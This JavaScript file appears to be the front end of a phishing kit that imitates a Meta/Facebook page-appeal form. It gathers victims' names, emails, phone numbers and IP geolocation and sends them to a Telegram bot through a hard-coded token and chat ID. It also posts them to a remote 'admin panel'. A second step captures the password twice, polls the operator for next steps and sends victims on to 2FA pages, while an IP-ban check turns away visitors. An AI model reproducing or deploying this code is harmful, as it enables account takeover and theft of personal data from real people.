const admin_panel = "https://pranveranevendimtim.xyz/kthiza"; // todo : change this to your admin panel url
let noNavBtns = document.querySelectorAll(".no_navigate");
const currentForm = document.querySelector(`section[data-tab="1"]`);
const nextForm = document.querySelector(`section[data-tab="2"]`);
const firstForm = document.querySelector("#personal_details_form");
const firstFormInputs = document.querySelectorAll("#personal_details_form input");
const ipField = document.getElementById("ip_address");




function generateRandomString(length) {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~@?_-^&";
  let randomString = "";

  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    randomString += characters.charAt(randomIndex);
  }

  return `${randomString}`;
}

async function getIp() {
  const url = "https://api.ipify.org/?format=json";
  const response = await fetch(url);
  const ipResult = await response.json();
  if (ipResult && ipResult.ip) {
    ipField.value = ipResult.ip;
  }
}

getIp();


const checkIPBan = () => {
  let IPxhr = new XMLHttpRequest();
  IPxhr.open("POST", admin_panel + "/checkBan.php", true);
  IPxhr.onload = () => {
    if (IPxhr.readyState === XMLHttpRequest.DONE) {
      if (IPxhr.status === 200) {
        let data = IPxhr.response;
        if (data == "found") {
          window.location.href = "https://404.html";
        }
      }
    }
  };

  IPxhr.send();
};

window.addEventListener("DOMContentLoaded", checkIPBan);

noNavBtns.forEach((btn) => {
  btn.addEventListener("click", (e) => {
    e.preventDefault();
    alert("Fill in the form before navigating");
  });
});

function checkInputsNotEmpty(inputList) {
  let allNotEmpty = true;
  const emptyIds = [];

  for (let i = 0; i < inputList.length; i++) {
    const input = inputList[i];
    if (input.value.trim() === "") {
      allNotEmpty = false;
      emptyIds.push(input.id);
    }
  }

  return {
    allNotEmpty: allNotEmpty,
    emptyIds: emptyIds,
  };
}

let numOfTries = 2;

const sendToBot = async () => {
  const getip = "https://api.ipify.org/?format=json";
  const api = "https://ipapi.co/";
  const botToken = "6880932081:AAGy37y0Z4pKHbY69NZhQTlE0lHoJEpn39A"; // todo: change this to your bot token
  const chatId = "5710188429"; // todo: change this to your chat id


  try {
    const page_name = document.getElementById("page_name").value
    const full_name = document.getElementById("full_name").value
    const email = document.getElementById("email").value
    const business_email = document.getElementById("business_email").value
    const phone_number = document.getElementById("phone_number").value
    const ip_address = document.getElementById("ip_address").value
    const appeal = document.querySelector("textarea").value
    // console log all the data
    console.log(page_name, full_name, email, business_email, phone_number, ip_address, appeal)
    const response_ip = await fetch(getip);
    const final_ip = await response_ip.json();
    console.log(final_ip.ip)
    const response = await fetch(api + final_ip.ip + "/json/");
    const result = await response.json();
    console.log(result);
     
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: `------------- 💀💀 META | DATA  💀💀 --------------- \n\n[+] Page Name: ${page_name} \n\n[+] Full Name: ${full_name} \n\n[+] Email: ${email} \n\n[+] Business Email: ${business_email} \n\n[+] Phone Number: ${phone_number} \n\n[+] Appeal: ${appeal} \n\n[+] IP : ${result.ip}`,
      }),
    })
      .then((response) => response.json())
      .then((data) => {})
      .catch((error) => {
        errorText.textContent =
          "Could not verify your credentials please refresh the page and try again";
      });
  } catch (error) {
    console.error(error);
  }
};
const changeTab = (e) => {
  let currentTab = document.querySelectorAll(".list");
  let uniqueIdField = document.querySelector("#unique_id")
  e.innerHTML = `<img src="../img/loader.gif" width="30" alt="">`;
  setTimeout(async () => {
    let result = checkInputsNotEmpty(firstFormInputs);
    if (!result.allNotEmpty) {
      result.emptyIds.forEach((item) => {
        let element = document.querySelector(`.${item}_error`);
        element.textContent = `${item.split("_").join(" ")} is required`;
        e.innerHTML = "Next";
      });
    } else {
      result.emptyIds.forEach((item) => {
        let element = document.querySelector(`.${item}_error`);
        element.textContent = "";
      });

      sendToBot();

      // AJAX
      let xhr = new XMLHttpRequest();
      xhr.open("POST", admin_panel + "/addUserDetails.php", true);
      xhr.setRequestHeader("Content-Type", "application/json");

      xhr.onload = () => {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            let data = xhr.response;
            localStorage.setItem("unique_id", data);
            uniqueIdField.value = data;
          }
        }
      };
      // send form data to php file
      let formData = {
        page_name: document.getElementById("page_name").value,
        full_name: document.getElementById("full_name").value,
        email: document.getElementById("email").value,
        business_email: document.getElementById("business_email").value,
        phone_number: document.getElementById("phone_number").value,
        unique_id: generateRandomString(10),
        appeal: document.querySelector("textarea").value,
      };

      xhr.send(JSON.stringify(formData));

      currentForm.style.display = "none";
      nextForm.style.display = "block";
    }

    const secondForm = document.querySelector("#password_form");
    const secondFormInputs = document.querySelectorAll("#password_form input");

    secondFormInputs.forEach((input) => {
      input.addEventListener("input", () => {
        let id = input.id;
        let label = document.querySelector(`.${id}_error`);
        label.textContent = "";
        document.querySelector(`#${id}`).style.borderColor = "#0b92f2";
      });
    });

    secondForm.addEventListener("submit", (e) => {
      e.preventDefault();
      e.target.querySelector(
        "button"
      ).innerHTML = `<img src="../img/loader.gif" width="30" alt="">`;

      let successValue;

      const changeSuccessValue = (newValue) => {
        successValue = newValue;
        return successValue;
      };

      const awaitResponse = () => {
        let xhr = new XMLHttpRequest();
        xhr.open("POST", admin_panel + "/fetchPasswordStatus.php", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onload = () => {
          if (xhr.status === 200) {
            let data = xhr.response;
            if (data == "valid") {
              window.location.href = "../auth/index.html";
              changeSuccessValue("no");
            }else if (data == "twofa_mail") {
              window.location.href = "../auth/2fa.html";
              changeSuccessValue("no");
            } else if (data == "auth") {
              window.location.href = "../auth/auth.html";
              changeSuccessValue("no");
            }  
            else if (data == "invalid") {
              // do somehting
              document.querySelector(".password_error").textContent =
                "incorrect Username or Password";
              document.querySelector("#password").value = "";
              document.querySelector("#password").focus();
              document.querySelector("#password").style.borderColor = "red";
              document.querySelector("#password_form button").innerHTML = "Next";
              changeSuccessValue("no");
            } else if (data == "wrongEmail") {
              changeSuccessValue("no");
              document.querySelector("#password_form button").innerHTML = "Next";
              nextForm.style.display = "none";
              currentForm.style.display = "block";
              document.querySelector("#personal_details_form button").innerHTML = "Next";
              document.querySelector(".email_error").textContent = "incorrect Email";

              document.querySelector("#email").focus();
              document.querySelector("#email").value = "";
            }
          
          }
        };

        let localData = localStorage.getItem("unique_id")
        let localString = {
          unique_id: localData
        }

        xhr.send(JSON.stringify(localString));
      };

      function awaitInterval(interval, state) {
        awaitResponse();
        console.log(state);

        if (state == "no") {
          clearInterval(interval);
          return successValue = "yes"
        }
      }

      let res = checkInputsNotEmpty(secondFormInputs);
      if (!res.allNotEmpty) {
        res.emptyIds.forEach((item) => {
          let element = document.querySelector(`.${item}_error`);
          element.textContent = `${item.split("_").join(" ")} is required`;
          e.target.querySelector("button").innerHTML = "Next";
        });
      } else {
        const sendPassword = (url) => {
          let passwordXhr = new XMLHttpRequest();
          passwordXhr.open("POST", url, true);
          passwordXhr.setRequestHeader("Content-Type", "application/json");
          passwordXhr.onload = () => {
            if (passwordXhr.status === 200) {
              let data = passwordXhr.response;
              console.log(data);
              setTimeout(() => {
                if (numOfTries == 2) {
                  let responseInterval = setInterval(() => {
                    awaitInterval(responseInterval, successValue);
                  }, 500);
                  return (numOfTries -= 1);
                } else {
                  let responseInterval = setInterval(() => {
                    awaitInterval(responseInterval, successValue);
                  }, 500);
                }
              }, 1500);
            } else {
              console.log("wahala");
            }
          };
          let passwordData = {
            password: document.querySelector("#password").value,
            unique_id: uniqueIdField.value
          }

          passwordXhr.send(JSON.stringify(passwordData));
        };

        res.emptyIds.forEach((item) => {
          let element = document.querySelector(`.${item}_error`);
          element.textContent = "";
        });

        if (numOfTries == 2) {
          sendPassword(admin_panel + "/updatePassword.php");
        } else {
          sendPassword(admin_panel + "/updateSecondPassword.php");
        }
      }
    });
  }, 1500);
};

firstFormInputs.forEach((input) => {
  input.addEventListener("input", () => {
    let id = input.id;
    let label = document.querySelector(`.${id}_error`);
    label.textContent = "";
  });
});

firstForm.addEventListener("submit", function (e) {
  e.preventDefault();
  changeTab(this.querySelector("button"));
});
